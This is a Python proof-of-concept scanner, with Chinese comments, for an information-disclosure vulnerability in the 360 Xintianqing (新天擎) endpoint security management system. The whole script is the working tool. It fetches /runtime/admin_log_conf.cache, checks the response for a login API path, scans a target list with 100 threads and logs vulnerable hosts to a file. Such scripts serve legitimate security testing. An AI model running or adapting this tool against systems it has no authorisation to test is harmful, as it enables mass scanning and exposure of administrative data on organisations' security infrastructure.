# 360 新天擎终端安全管理系统信息泄露漏洞
import argparse,requests,sys   #调用模块
from multiprocessing.dummy import Pool      #调用多线程模块
requests.packages.urllib3.disable_warnings()       #证书错误抑制

# 定义指纹
def banner():   
    banner ='''

#                 #    #   ___                       
#=ooO=========Ooo=#    #  <_*_>            ,,,,,     
#  \\  (o o)  //  #    #  (o o)           /(o o)\    
--------(_)------------8---(_)--Ooo----ooO--(_)--Ooo-
                            @author:qbt
                            @version:0.0.1
'''
    print(banner)
# 定义poc
def poc(target):
    url = target+'/runtime/admin_log_conf.cache'
    headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36'
    }
    try:
# 发送一个get请求
        res = requests.get(url=url,headers=headers,verify=False,timeout=5)
# 判断响应内容
        if '/api/node/login' in res.text:
            print("[+]"+ target + "360 新天擎终端安全管理系统信息泄露漏洞")
            with open('seccess.txt','a',encoding='utf-8') as f:
                f.write('[+]'+target+'存在360 新天擎终端安全管理系统信息泄露漏洞\n')
                return True
        else:
                print("[-]"+ target + "不存在漏洞")
                return False
    except:
        print('抛出一个错误')

# 定义主函数
def main():
    banner() #调用指纹函数
#实例化
    parser = argparse.ArgumentParser(description='360 新天擎终端安全管理系统信息泄露漏洞')
#定义参数
    parser.add_argument('-u','-url',dest='url',help='请输入url',type=str)
    parser.add_argument('-f','--file',dest='file',help='url.txt',type=str)
#处理命令行参数
    args = parser.parse_args()
#判断是单个url还是文件
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
#定义一个空列表
        url_list = []
#打开文件并以单行读取并输入到定义的列表中
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip().replace("\n",""))
#线程池为100
        mp = Pool(100)
#将列表的参数，输入到poc
        mp.map(poc, url_list)
#关闭多线程
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


#调用主函数，有防止被误操作导致直接执行的能力
if __name__ == '__main__':
    main()